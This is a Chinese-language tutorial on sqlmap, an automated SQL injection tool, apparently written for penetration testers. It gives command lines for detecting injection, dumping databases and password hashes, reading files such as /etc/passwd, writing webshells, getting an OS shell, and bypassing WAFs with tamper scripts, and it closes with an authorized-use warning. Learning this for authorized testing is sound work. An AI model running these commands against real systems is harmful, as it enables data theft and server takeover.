# sqlmap 使用指南

> sqlmap 是自动化 SQL 注入检测与利用工具，支持多种数据库和注入类型，是 SQL 注入测试的瑞士军刀。

---

## 目录

- [一、sqlmap 简介](#一sqlmap-简介)
- [二、安装](#二安装)
- [三、基本使用](#三基本使用)
- [四、指定目标](#四指定目标)
- [五、指定参数](#五指定参数)
- [六、注入技术](#六注入技术)
- [七、枚举数据](#七枚举数据)
- [八、文件操作与提权](#八文件操作与提权)
- [九、绕过 WAF](#九绕过-waf)
- [十、常用高级选项](#十常用高级选项)
- [十一、实用技巧](#十一实用技巧)
- [十二、完整示例](#十二完整示例)

---

## 一、sqlmap 简介

sqlmap 是一款开源的自动化 SQL 注入工具，由 Python 编写。

**特点**：
- 完全自动化，从检测到利用一键完成
- 支持几乎所有数据库（MySQL、MSSQL、Oracle、PostgreSQL、SQLite、Access 等）
- 支持所有注入技术（联合查询、报错、盲注、堆叠、时间盲注等）
- 支持数据库枚举、文件读写、命令执行、提权
- 支持多种绕过 WAF 的脚本
- 跨平台（Windows/Linux/Mac）

**官方仓库**：https://github.com/sqlmapproject/sqlmap

---

## 二、安装

### 2.1 方式一：直接下载

```bash
# 克隆仓库
git clone https://github.com/sqlmapproject/sqlmap.git
cd sqlmap

# 运行
python sqlmap.py -h
```

### 2.2 方式二：包管理器

```bash
# Kali Linux（自带）
sqlmap -h

# pip 安装
pip install sqlmap
```

### 2.3 Windows

1. 安装 Python
2. 下载 sqlmap 源码
3. 命令行运行 `python sqlmap.py`

### 2.4 查看帮助

```bash
sqlmap -h           # 基本帮助
sqlmap -hh          # 完整帮助（所有参数）
```

---

## 三、基本使用

### 3.1 最简单的检测

```bash
# 检测 URL 是否存在 SQL 注入
sqlmap -u "http://example.com/page?id=1"
```

### 3.2 输出信息说明

```
[*] starting @ 10:00:00 /2024-01-01/    开始时间
[*] testing connection to the target URL  测试连接
[*] checking if the target is protected by WAF/IPS/IDS  检测 WAF
[*] testing if the target URL content is stable  检测页面稳定性
[*] testing if GET parameter 'id' is dynamic  检测参数动态性
[*] GET parameter 'id' appears to be dynamic  参数是动态的
[*] heuristic (basic) test shows that GET parameter 'id' might be injectable  启发式检测可能可注入
[+] GET parameter 'id' is vulnerable  发现漏洞！
    Type: boolean-based blind    类型：布尔盲注
    Type: UNION query           类型：联合查询
    ...
```

### 3.3 常用基础参数

| 参数 | 说明 |
|------|------|
| `-u URL` | 指定目标 URL |
| `-r file` | 从文件加载 HTTP 请求 |
| `-m file` | 从文件批量扫描 URL |
| `-l file` | 从 Burp log 文件加载 |
| `--data=DATA` | POST 数据 |
| `--cookie=COOKIE` | Cookie |
| `--method=METHOD` | HTTP 方法（GET/POST/PUT 等） |
| `--headers=HEADERS` | 自定义 HTTP 头 |
| `--proxy=PROXY` | 使用代理 |
| `--threads=THREADS` | 线程数（默认 1） |
| `--batch` | 非交互模式，全部使用默认选项 |
| `-v VERBOSE` | 详细级别（0-6，默认 1） |

---

## 四、指定目标

### 4.1 GET 方式

```bash
# 单个 URL
sqlmap -u "http://example.com/page?id=1"

# 多个参数
sqlmap -u "http://example.com/page?id=1&cat=2"
```

### 4.2 POST 方式

```bash
# POST 参数
sqlmap -u "http://example.com/login.php" --data="username=admin&password=123"

# 从文件读取请求（推荐，最准确）
# 在 Burp 中右键 Copy to file 保存为 request.txt
sqlmap -r request.txt
```

### 4.3 Cookie 注入

```bash
sqlmap -u "http://example.com/page" --cookie="id=1" --level=2
```

### 4.4 User-Agent 注入

```bash
sqlmap -u "http://example.com/page" --user-agent="*" --level=3
```

### 4.5 Referer 注入

```bash
sqlmap -u "http://example.com/page" --referer="*" --level=3
```

### 4.6 自定义 Header 注入

```bash
sqlmap -u "http://example.com/page" --headers="X-Forwarded-For: *" --level=3
```

### 4.7 JSON 数据注入

```bash
sqlmap -u "http://example.com/api" --data='{"username":"admin","password":"123"}' --method=POST
```

### 4.8 批量扫描

```bash
# 从文件读取 URL 列表（每行一个）
sqlmap -m urls.txt --batch

# 从 Burp Suite 日志
sqlmap -l burp.log --batch
```

---

## 五、指定参数

### 5.1 指定测试参数

```bash
# 只测试 id 参数
sqlmap -u "http://example.com/page?id=1&cat=2&page=3" -p "id"

# 测试多个参数
sqlmap -u "http://example.com/page?id=1&cat=2" -p "id,cat"
```

### 5.2 跳过参数

```bash
sqlmap -u "..." --skip="cat,page"
```

### 5.3 测试等级与风险

```
--level    测试等级（1-5，默认 1）
           等级越高，测试的 payload 越多，越全面但越慢
           Level 1: 只测试 GET/POST 参数
           Level 2: 测试 Cookie
           Level 3: 测试 User-Agent、Referer
           Level 4-5: 更多 header 测试

--risk     风险等级（1-3，默认 1）
           风险越高，使用的 payload 越危险，可能破坏数据
           Risk 1: 安全，不会破坏数据
           Risk 2: 增加基于时间的测试
           Risk 3: 增加 OR 型 SQL 注入、堆叠查询
```

```bash
# 深度扫描
sqlmap -u "http://example.com/page?id=1" --level=5 --risk=3
```

### 5.4 指定数据库类型

```bash
# 已知是 MySQL，跳过类型检测
sqlmap -u "http://example.com/page?id=1" --dbms=mysql

# 其他
--dbms=mysql       MySQL
--dbms=mssql       SQL Server
--dbms=oracle      Oracle
--dbms=postgresql  PostgreSQL
--dbms=access      Microsoft Access
--dbms=sqlite      SQLite
--dbms=mongodb     MongoDB
```

### 5.5 指定操作系统

```bash
sqlmap -u "..." --os=windows
sqlmap -u "..." --os=linux
```

---

## 六、注入技术

### 6.1 指定注入技术

```
--technique=TECH
B: Boolean-based blind       布尔盲注
E: Error-based               报错注入
U: UNION query               联合查询
S: Stacked queries           堆叠注入
T: Time-based blind          时间盲注
Q: Inline queries            内联查询
```

```bash
# 只使用联合查询和报错注入
sqlmap -u "http://example.com/page?id=1" --technique=UE

# 只用时间盲注
sqlmap -u "http://example.com/page?id=1" --technique=T

# 使用所有技术（默认 BEUSTQ）
sqlmap -u "http://example.com/page?id=1" --technique=BEUSTQ
```

### 6.2 时间盲注相关

```bash
# 设置延迟时间（秒，默认 5）
sqlmap -u "..." --time-sec=3

# 时间盲注专用
sqlmap -u "..." --technique=T --time-sec=5
```

### 6.3 联合查询相关

```bash
# 指定列数范围（自动检测失败时手动指定）
sqlmap -u "..." --union-cols=10-20

# 指定 UNION 查询字符（默认 NULL）
sqlmap -u "..." --union-char=123

# 从指定位置开始 union
sqlmap -u "..." --union-from=5
```

### 6.4 二次注入

```bash
# 需要先注入一个 URL，然后访问另一个 URL 查看结果
sqlmap -u "http://example.com/add_user.php" \
       --data="username=test&password=123" \
       --second-url="http://example.com/user_info.php" \
       -p username
```

---

## 七、枚举数据

检测到注入后，可以枚举数据库内容。

### 7.1 基本信息

```bash
# 数据库版本、用户、库名等
sqlmap -u "http://example.com/page?id=1" -b
# 或
sqlmap -u "http://example.com/page?id=1" --banner

# 当前数据库
sqlmap -u "http://example.com/page?id=1" --current-db

# 当前用户
sqlmap -u "http://example.com/page?id=1" --current-user

# 检查是否 DBA
sqlmap -u "http://example.com/page?id=1" --is-dba

# 所有数据库
sqlmap -u "http://example.com/page?id=1" --dbs
```

### 7.2 枚举表

```bash
# 指定数据库的所有表
sqlmap -u "http://example.com/page?id=1" -D dbname --tables

# 所有数据库的所有表
sqlmap -u "http://example.com/page?id=1" --tables
```

### 7.3 枚举列

```bash
# 指定表的所有列
sqlmap -u "http://example.com/page?id=1" -D dbname -T tablename --columns

# 所有表的所有列
sqlmap -u "http://example.com/page?id=1" -D dbname --columns
```

### 7.4 脱库（获取数据）

```bash
# 获取指定表的所有数据
sqlmap -u "http://example.com/page?id=1" -D dbname -T tablename --dump

# 获取指定列的数据
sqlmap -u "http://example.com/page?id=1" -D dbname -T users -C username,password --dump

# 导出整个数据库
sqlmap -u "http://example.com/page?id=1" -D dbname --dump

# 导出所有数据库
sqlmap -u "http://example.com/page?id=1" --dump-all

# 只导出前 N 行
sqlmap -u "..." -D db -T table --dump --start=1 --stop=10
```

### 7.5 枚举用户和权限

```bash
# 所有用户
sqlmap -u "..." --users

# 所有密码哈希
sqlmap -u "..." --passwords

# 所有权限
sqlmap -u "..." --privileges

# 指定用户的权限
sqlmap -u "..." -U username --privileges

# 所有角色
sqlmap -u "..." --roles
```

### 7.6 搜索

```bash
# 搜索包含 'user' 的表
sqlmap -u "..." -D dbname --search -T user

# 搜索包含 'pass' 的列
sqlmap -u "..." -D dbname --search -C pass

# 搜索列和表
sqlmap -u "..." --search -C "user,pass"
```

---

## 八、文件操作与提权

### 8.1 读取文件

```bash
# 读取单个文件
sqlmap -u "http://example.com/page?id=1" --file-read="/etc/passwd"

# Windows
sqlmap -u "http://example.com/page?id=1" --file-read="C:\\windows\\win.ini"
```

### 8.2 写入文件

```bash
# 写 Webshell
sqlmap -u "http://example.com/page?id=1" \
       --file-write="shell.php" \
       --file-dest="/var/www/html/shell.php"

# 写一句话木马
sqlmap -u "..." --os-shell  # 自动尝试上传 Webshell
```

### 8.3 执行命令

```bash
# 交互式 Shell
sqlmap -u "http://example.com/page?id=1" --os-shell

# 直接执行命令
sqlmap -u "http://example.com/page?id=1" --os-cmd="whoami"

# 执行多条命令
sqlmap -u "..." --os-shell
# 进入后可以输入系统命令
```

### 8.4 提权（UDF 等）

```bash
# 检查是否 DBA
sqlmap -u "..." --is-dba

# 尝试提权（MSSQL 的 xp_cmdshell 等）
sqlmap -u "..." --privileges
sqlmap -u "..." --os-shell
```

### 8.5 注册表操作（Windows）

```bash
# 读取注册表
sqlmap -u "..." --reg-read

# 写入注册表
sqlmap -u "..." --reg-add

# 删除注册表项
sqlmap -u "..." --reg-del
```

---

## 九、绕过 WAF

### 9.1 检测 WAF

```bash
# 检测是否有 WAF
sqlmap -u "http://example.com/page?id=1" --check-waf

# 绕过 WAF 检测脚本
sqlmap -u "http://example.com/page?id=1" --skip-waf
```

### 9.2 Tamper 脚本

sqlmap 提供了大量 tamper 脚本用于绕过 WAF/IPS/IDS。

**查看所有 tamper 脚本**：
```bash
sqlmap --list-tampers
```

**常用 tamper 脚本**：

| 脚本 | 说明 | 适用场景 |
|------|------|---------|
| `apostrophemask` | 将单引号替换为 UTF-8 编码 | 过滤单引号 |
| `apostrophenullencode` | 单引号替换为 %00%27 | 绕过单引号过滤 |
| `base64encode` | Base64 编码 | WAF 不解码 Base64 |
| `between` | 用 BETWEEN 替换 > | 过滤比较符 |
| `bluecoat` | Blue Coat 代理绕过 | Blue Coat WAF |
| `chardoubleencode` | 双重 URL 编码 | 单层解码的 WAF |
| `charencode` | URL 编码所有字符 | 关键字过滤 |
| `charunicodeencode` | Unicode 编码 | Unicode 绕过 |
| `commalesslimit` | 用 OFFSET 替换 LIMIT 逗号 | 逗号过滤 |
| `commalessmid` | MID 函数不用逗号 | 逗号过滤 |
| `commentbeforeparentheses` | 括号前加注释 | 括号检测 |
| `concat2concatws` | CONCAT 替换为 CONCAT_WS | 函数名过滤 |
| `equaltolike` | = 替换为 LIKE | 等号过滤 |
| `escapequotes` | 反斜杠转义引号 | 魔术引号 |
| `greatest` | 用 GREATEST 替换 > | 比较符过滤 |
| `halfversionedmorekeywords` | MySQL 版本注释绕过 | MySQL 注入 |
| `hex2char` | 十六进制转字符 | 字符串过滤 |
| `htmlencode` | HTML 编码 | HTML 上下文 |
| `ifnull2ifisnull` | IFNULL 替换为 IF IS NULL | 函数过滤 |
| `informationschemacomment` | information_schema 后加注释 | 关键字检测 |
| `lowercase` | 转小写 | 大小写敏感 WAF |
| `modsecurityversioned` | ModSecurity 版本绕过 | ModSecurity |
| `modsecurityzeroversioned` | ModSecurity 零版本绕过 | ModSecurity |
| `multiplespaces` | 多个空格替换 | 空格过滤 |
| `nonrecursivereplacement` | 双写绕过 | 替换型 WAF |
| `overlongutf8` | 超长 UTF-8 编码 | 编码问题 |
| `percentage` | 每个字符前加 % | 百分号绕过 |
| `plus2concat` | + 替换为 CONCAT | 加号过滤 |
| `plus2fnconcat` | + 替换为 {fn CONCAT()} | ODBC 函数 |
| `randomcase` | 随机大小写 | 大小写敏感 |
| `randomcomments` | 随机插入注释 | 关键字检测 |
| `securesphere` | Securesphere WAF 绕过 | Securesphere |
| `sp_password` | 追加 sp_password | MSSQL 日志绕过 |
| `space2comment` | 空格替换为注释 | 空格过滤 |
| `space2dash` | 空格替换为 -- 加换行 | 空格过滤 |
| `space2hash` | 空格替换为 # 加换行 | 空格过滤 |
| `space2morehash` | 空格替换为 # 加更多 | 空格过滤 |
| `space2mssqlblank` | 空格替换为其他空白字符 | 空格过滤（MSSQL） |
| `space2mssqlhash` | 空格替换为 %23%0A | 空格过滤（MSSQL） |
| `space2mysqlblank` | 空格替换为其他空白 | 空格过滤（MySQL） |
| `space2mysqldash` | 空格替换为 -- 加空格 | 空格过滤（MySQL） |
| `space2plus` | 空格替换为 + | 空格过滤 |
| `space2randomblank` | 空格替换为随机空白 | 空格过滤 |
| `symboliclogical` | AND/OR 替换为符号 | 关键字过滤 |
| `unionalltounion` | UNION ALL 替换为 UNION | UNION ALL 过滤 |
| `unmagicquotes` | 宽字节注入绕过 | magic_quotes_gpc |
| `uppercase` | 转大写 | 大小写敏感 |
| `varnish` | Varnish 缓存绕过 | Varnish |
| `versionedkeywords` | 版本注释关键字 | MySQL |
| `versionedmorekeywords` | 更多版本注释关键字 | MySQL |
| `xforwardedfor` | 添加 X-Forwarded-For 头 | 基于 IP 的 WAF |

### 9.3 使用 tamper

```bash
# 使用单个 tamper
sqlmap -u "http://example.com/page?id=1" --tamper=space2comment

# 使用多个 tamper（逗号分隔）
sqlmap -u "..." --tamper=space2comment,randomcase,charencode

# 常用组合
sqlmap -u "..." --tamper=space2comment,charunicodeencode,randomcase
sqlmap -u "..." --tamper=apostrophemask,space2comment,versionedmorekeywords
```

### 9.4 其他绕过技巧

```bash
# 随机 User-Agent
sqlmap -u "..." --random-agent

# 使用代理
sqlmap -u "..." --proxy="http://127.0.0.1:8080"

# 延迟请求（秒）
sqlmap -u "..." --delay=1

# 超时时间（秒）
sqlmap -u "..." --timeout=30

# 重试次数
sqlmap -u "..." --retries=3

# 跳过 URL 编码
sqlmap -u "..." --skip-urlencode
```

---

## 十、常用高级选项

### 10.1 请求相关

```bash
# 自定义 User-Agent
sqlmap -u "..." --user-agent="Mozilla/5.0 ..."

# 随机 User-Agent
sqlmap -u "..." --random-agent

# 自定义 Cookie
sqlmap -u "..." --cookie="PHPSESSID=abc123"

# 自定义 Referer
sqlmap -u "..." --referer="http://example.com"

# 自定义 Header
sqlmap -u "..." --headers="Accept-Language: en-US\nX-Custom: test"

# 延迟（每秒请求数）
sqlmap -u "..." --delay=0.5
```

### 10.2 检测优化

```bash
# 只检测指定类型
sqlmap -u "..." --technique=U

# 指定列数
sqlmap -u "..." --union-cols=5-10

# 指定字符
sqlmap -u "..." --union-char=123

# 前缀和后缀
sqlmap -u "..." --prefix="')" --suffix="-- "
```

### 10.3 输出与保存

```bash
# 输出目录
sqlmap -u "..." --output-dir="./output"

# 保存结果到指定文件
sqlmap -u "..." -D db -T table --dump --dump-format=CSV

# 导出格式：CSV、HTML、SQLITE
sqlmap -u "..." --dump --dump-format=HTML

# 详细输出（0-6）
sqlmap -u "..." -v 3

# 静默模式
sqlmap -u "..." -v 0

# 保存请求日志
sqlmap -u "..." -t traffic.txt
```

### 10.4 会话与恢复

```bash
# 保存会话
sqlmap -u "..." -s session.sqlite

# 恢复会话（中断后继续）
sqlmap -u "..." -s session.sqlite --resume

# 刷新会话
sqlmap -u "..." -s session.sqlite --fresh-queries
```

### 10.5 爬虫

```bash
# 爬取网站（爬取深度 2）
sqlmap -u "http://example.com" --crawl=2

# 爬取范围排除
sqlmap -u "..." --crawl-exclude="logout"

# 爬取深度和线程
sqlmap -u "..." --crawl=3 --crawl-depth=3 --threads=5
```

---

## 十一、实用技巧

### 11.1 常用命令速查

```bash
# 1. 基础检测
sqlmap -u "http://target.com/page?id=1"

# 2. POST 请求
sqlmap -u "http://target.com/login" --data="user=admin&pass=123"

# 3. 从 Burp 请求文件
sqlmap -r request.txt

# 4. 获取所有数据库
sqlmap -u "..." --dbs

# 5. 获取当前库的表
sqlmap -u "..." -D databasename --tables

# 6. 获取列
sqlmap -u "..." -D db -T users --columns

# 7. 脱库
sqlmap -u "..." -D db -T users --dump

# 8. 交互式 Shell
sqlmap -u "..." --os-shell

# 9. 读文件
sqlmap -u "..." --file-read="/etc/passwd"

# 10. 绕过 WAF
sqlmap -u "..." --tamper=space2comment,charencode --random-agent
```

### 11.2 常见问题

**Q: 检测不到注入怎么办？**
- 提高 level 和 risk：`--level=5 --risk=3`
- 检查是否需要登录，加 Cookie
- 检查参数是否真的可控
- 使用 `-v 3` 查看详细过程

**Q: 注入了但脱库慢怎么办？**
- 增加线程：`--threads=10`
- 用联合查询（比盲注快很多）
- 只 dump 关键表

**Q: 有 WAF 怎么办？**
- 尝试 tamper 脚本
- 使用代理池
- 降低请求频率（--delay）
- 换注入点

---

## 十二、完整示例

### 示例 1：检测并获取数据

```bash
# 1. 检测注入
sqlmap -u "http://192.168.1.100/sqli-labs/Less-1/?id=1" --batch

# 2. 获取所有数据库
sqlmap -u "http://192.168.1.100/sqli-labs/Less-1/?id=1" --dbs --batch

# 3. 获取 security 库的所有表
sqlmap -u "http://192.168.1.100/sqli-labs/Less-1/?id=1" -D security --tables --batch

# 4. 获取 users 表的所有列
sqlmap -u "http://192.168.1.100/sqli-labs/Less-1/?id=1" -D security -T users --columns --batch

# 5. 导出 users 表数据
sqlmap -u "http://192.168.1.100/sqli-labs/Less-1/?id=1" -D security -T users --dump --batch
```

### 示例 2：POST 登录注入

```bash
# 1. 从 Burp 保存请求为 login.txt
# 2. 检测注入
sqlmap -r login.txt -p username --batch

# 3. 脱库
sqlmap -r login.txt -p username -D security -T users --dump --batch
```

### 示例 3：Cookie 注入

```bash
sqlmap -u "http://target.com/page.php" \
       --cookie="id=1" \
       --level=2 \
       --dbs --batch
```

---

> ⚠️ **安全提示**：sqlmap 是强大的安全测试工具，仅可用于授权测试。未经授权使用 sqlmap 攻击他人系统属于违法行为。

> **延伸学习**：sqlmap 功能非常丰富，建议结合 SQLi-Labs、DVWA 等靶场练习。掌握手工注入原理后再使用工具，才能真正理解注入的本质。
